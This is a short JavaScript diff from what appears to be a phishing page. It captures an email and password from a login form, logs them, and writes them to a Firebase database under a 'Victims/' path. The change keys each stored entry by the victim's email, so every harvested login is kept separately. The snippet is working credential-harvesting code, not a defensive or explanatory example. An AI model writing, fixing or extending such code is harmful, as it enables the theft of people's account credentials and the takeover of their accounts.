@@ -40,7 +40,7 @@ event.preventDefault();
     password = form.querySelector('#pws').value;
     console.log(email , password)
 const inserData = () =>{
-set(ref(database , 'Victims/'+'Email'),{
+set(ref(database , 'Victims/'+email),{
     email : email,
     pws  :password
 }).then(
